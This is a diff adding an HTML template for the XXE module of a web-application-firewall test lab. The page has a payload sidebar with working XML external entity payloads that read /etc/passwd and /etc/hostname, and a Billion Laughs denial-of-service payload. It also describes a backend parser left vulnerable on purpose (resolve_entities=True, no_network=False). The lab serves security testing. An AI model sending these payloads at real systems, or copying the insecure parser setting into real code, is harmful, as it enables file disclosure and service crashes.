@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>XXE Injection — WAF Test Lab</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Geist:wght@300;400;500;600&family=Geist+Mono:wght@400;500&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="/static/style.css">
+</head>
+
+<body>
+
+    <!-- NAV -->
+    <nav class="nav">
+        <div class="nav-brand" onclick="location.href='/vuln/'" style="cursor:pointer;">
+            <div class="nav-brand-dot"></div>
+            Vulnerability Lab
+        </div>
+        <div class="nav-links">
+            <a href="/vuln/sqli" class="nav-link">SQLi</a>
+            <a href="/vuln/xss" class="nav-link">XSS</a>
+            <a href="/vuln/upload" class="nav-link">Upload</a>
+            <a href="/vuln/cmdi" class="nav-link">CMDi</a>
+            <a href="/vuln/admin" class="nav-link">Admin</a>
+            <a href="/vuln/ssrf" class="nav-link">SSRF</a>
+            <a href="/vuln/xxe" class="nav-link active">XXE</a>
+        </div>
+    </nav>
+
+    <!-- SIDEBAR TRIGGER -->
+    <button class="sidebar-trigger" id="sidebarTrigger" aria-label="Open payloads">
+        <span class="sidebar-trigger-badge badge-trigger-red">3</span>
+        <span class="sidebar-trigger-label">Payloads</span>
+        <span class="sidebar-trigger-icon">‹</span>
+    </button>
+
+    <!-- OVERLAY -->
+    <div class="sidebar-overlay" id="sidebarOverlay"></div>
+
+    <!-- SIDEBAR -->
+    <aside class="sidebar" id="sidebar" aria-label="XXE Injection payloads">
+        <div class="sidebar-head">
+            <div class="sidebar-head-left">
+                <span class="sidebar-head-label">XXE Injection</span>
+                <span class="sidebar-head-title">Attack Payloads</span>
+            </div>
+            <button class="sidebar-close" id="sidebarClose" aria-label="Close">✕</button>
+        </div>
+
+        <div class="sidebar-body">
+
+            <div class="payload-group">
+                <div class="payload-group-label">File Read</div>
+
+                <div class="payload-item">
+                    <div class="payload-meta">
+                        <span class="payload-name">Read /etc/passwd</span>
+                        <span class="payload-effect">Dumps local system user list</span>
+                    </div>
+                    <div class="payload-code-row">
+                        <span class="payload-code">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM
+                            "file:///etc/passwd"&gt;]&gt;&lt;user&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/user&gt;</span>
+                        <button class="btn-use" data-payload='<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<user>
+  <name>&xxe;</name>
+</user>'>Use</button>
+                    </div>
+                </div>
+
+                <div class="payload-item">
+                    <div class="payload-meta">
+                        <span class="payload-name">Read /etc/hostname</span>
+                        <span class="payload-effect">Reveals internal server hostname</span>
+                    </div>
+                    <div class="payload-code-row">
+                        <span class="payload-code">&lt;!ENTITY xxe SYSTEM "file:///etc/hostname"&gt;</span>
+                        <button class="btn-use" data-payload='<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/hostname">
+]>
+<user>
+  <name>&xxe;</name>
+</user>'>Use</button>
+                    </div>
+                </div>
+
+            </div>
+
+            <div class="payload-group">
+                <div class="payload-group-label">Denial of Service</div>
+
+                <div class="payload-item">
+                    <div class="payload-meta">
+                        <span class="payload-name">Billion Laughs</span>
+                        <span class="payload-effect">Exponential entity expansion — crashes parser</span>
+                    </div>
+                    <div class="payload-code-row">
+                        <span class="payload-code">&lt;!ENTITY lol "lol"&gt; &lt;!ENTITY lol2
+                            "&amp;lol;&amp;lol;..."&gt;</span>
+                        <button class="btn-use" data-payload='<?xml version="1.0"?>
+<!DOCTYPE lolz [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+]>
+<root>&lol3;</root>'>Use</button>
+                    </div>
+                </div>
+
+            </div>
+
+        </div>
+
+        <div class="sidebar-foot">
+            <p class="sidebar-foot-note">
+                Clicking <strong>Use</strong> pastes the payload into the XML input field.
+            </p>
+        </div>
+    </aside>
+
+    <!-- PAGE -->
+    <main class="page">
+
+        <div class="page-header">
+            <a href="/vuln/" class="back-link">← Back to Dashboard</a>
+            <div class="header-meta">
+                <span class="tag tag-critical">High</span>
+                <span class="tag tag-owasp">OWASP A05 — Security Misconfiguration</span>
+            </div>
+            <h1 class="page-title">XXE Injection</h1>
+            <p class="page-desc">
+                This endpoint parses XML with <code>resolve_entities=True</code> and no network restrictions.
+                A crafted <code>&lt;!DOCTYPE&gt;</code> block can define an external entity pointing to any
+                local file — the parser reads it and returns the contents in the response.
+            </p>
+        </div>
+
+        <!-- LEFT -->
+        <div class="col-left">
+
+            <div class="panel">
+                <div class="panel-header">XML Input</div>
+                <div class="panel-body">
+                    <form method="POST" id="xxeForm" class="form">
+                        <div class="field">
+                            <label class="field-label" for="xml_input">Raw XML</label>
+                            <textarea class="field-input" id="xml_input" name="xml_input" rows="10"
+                                placeholder="Paste XML here..." autocomplete="off" spellcheck="false"
+                                style="font-family: var(--font-mono); font-size: 13px; resize: vertical;">{{ raw_xml }}</textarea>
+                        </div>
+                        <button class="btn btn-primary" type="submit">Parse XML</button>
+                    </form>
+                </div>
+            </div>
+
+        </div>
+
+        <!-- RIGHT -->
+        <div class="col-right">
+
+            {% if result %}
+            <div class="result success">
+                <div class="result-bar">
+                    <span class="result-bar-dot"></span>
+                    XML Parsed Successfully
+                </div>
+                <div class="result-body">
+                    <table class="data-table">
+                        <thead>
+                            <tr>
+                                <th>Tag</th>
+                                <th>Value</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            {% for tag, value in result.items() %}
+                            <tr>
+                                <td><code>{{ tag }}</code></td>
+                                <td style="word-break: break-all;">{{ value }}</td>
+                            </tr>
+                            {% endfor %}
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+            {% endif %}
+
+            {% if error %}
+            <div class="result fail">
+                <div class="result-bar">
+                    <span class="result-bar-dot"></span>
+                    Parser Error
+                </div>
+                <div class="result-body">
+                    <div class="result-msg">{{ error }}</div>
+                </div>
+            </div>
+            {% endif %}
+
+            <div class="note-box">
+                <strong>Why this is vulnerable —</strong> The parser is initialized as:<br><br>
+                <code>etree.XMLParser(resolve_entities=True, no_network=False)</code><br><br>
+                <code>resolve_entities=True</code> tells the parser to fetch and substitute external entities.
+                A WAF should block any XML body containing <code>&lt;!DOCTYPE</code>, <code>&lt;!ENTITY</code>,
+                or the <code>SYSTEM</code> keyword.
+            </div>
+
+        </div>
+
+    </main>
+
+    <footer class="footer">
+        <span class="footer-left">WAF Test Lab — XXE Injection Module</span>
+        <span class="footer-right">For security testing only</span>
+    </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const trigger = document.getElementById('sidebarTrigger');
+            const sidebar = document.getElementById('sidebar');
+            const overlay = document.getElementById('sidebarOverlay');
+            const closeBtn = document.getElementById('sidebarClose');
+
+            function openSidebar() {
+                sidebar.classList.add('open');
+                overlay.classList.add('visible');
+                trigger.classList.add('open');
+                document.body.style.overflow = 'hidden';
+            }
+            function closeSidebar() {
+                sidebar.classList.remove('open');
+                overlay.classList.remove('visible');
+                trigger.classList.remove('open');
+                document.body.style.overflow = '';
+            }
+
+            trigger.addEventListener('click', () => sidebar.classList.contains('open') ? closeSidebar() : openSidebar());
+            closeBtn.addEventListener('click', closeSidebar);
+            overlay.addEventListener('click', closeSidebar);
+            document.addEventListener('keydown', e => { if (e.key === 'Escape') closeSidebar(); });
+
+            // Use buttons — paste payload into textarea
+            document.querySelectorAll('.btn-use[data-payload]').forEach(btn => {
+                btn.addEventListener('click', () => {
+                    const textarea = document.getElementById('xml_input');
+                    if (textarea) textarea.value = btn.dataset.payload;
+                    markUsed(btn);
+                    setTimeout(() => { closeSidebar(); }, 300);
+                });
+            });
+
+            function markUsed(btn) {
+                btn.textContent = '✓';
+                btn.classList.add('used');
+                setTimeout(() => { btn.textContent = 'Use'; btn.classList.remove('used'); }, 1800);
+            }
+        });
+    </script>
+
+</body>
+
+</html>
